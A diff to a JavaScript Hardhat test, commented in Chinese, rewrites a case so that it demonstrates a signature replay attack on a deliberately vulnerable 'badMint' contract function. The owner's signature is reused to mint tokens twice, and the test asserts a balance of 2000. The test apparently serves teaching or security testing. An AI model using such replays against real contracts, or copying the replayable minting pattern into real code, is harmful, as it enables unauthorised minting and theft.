@@ -13,25 +13,28 @@ describe("SignatureReplay", function () {
         await sigReplay.deployed();
     });
 
-    it("Should be ", async () => {
-        expect(owner.address).to.eq(await sigReplay.signer_1());
-        console.log(`signer_1: ${await sigReplay.signer_1()}`);
-        // 交易 hash
-        console.log(`user.address: ${user.address}`);
+    it("Should simulate signature replay attack", async () => {
+        console.log(`owner address: ${owner.address}`);
         const messageHash = await sigReplay.getMessageHash(user.address, 1000);
-        console.log(`messageHash: ${messageHash}`);
-        const ethHash = await sigReplay.toEthSignedMessageHash(messageHash)
-        console.log(`ethHash: ${ethHash}`);
-        // user 账户签名()
-        const signature = await owner.signMessage(ethHash);
-        // 验证签名
-        const address = await verifyMessage(ethHash, signature);
-        console.log(`address: ${address}`);
+        const ethHash = await sigReplay.toEthSignedMessageHash(messageHash);
+        const signature = await owner.signMessage(ethers.utils.arrayify(messageHash));
+    
+        const verigyAddress = await sigReplay.verifyAddress(ethHash, signature);
+        console.log(`verigyAddress: ${verigyAddress}`);
+        // 第一次调用 badMint
+        console.log(`badMint(${user.address}, 1000, ${signature})`);
+        await sigReplay.badMint(user.address, 1000, signature);
         
-        const verifyAddress = await sigReplay.verifyAddress(ethHash, signature);
-        console.log(`verifyAddress: ${verifyAddress}`);
-
-        // 签名重放
-        // await sigReplay.badMint(user.address, 1000, signature);
+        // 检查用户余额，应为 1000
+        let userBalance = await sigReplay.balanceOf(user.address);
+        expect(userBalance.toString()).to.equal('1000');
+    
+        // 使用相同的签名再次调用 badMint，模拟签名重放攻击
+        await sigReplay.badMint(user.address, 1000, signature);
+    
+        // 检查用户余额，如果余额为 2000，说明签名重放攻击成功
+        userBalance = await sigReplay.balanceOf(user.address);
+        expect(userBalance.toString()).to.equal('2000');
     });
+    
 });
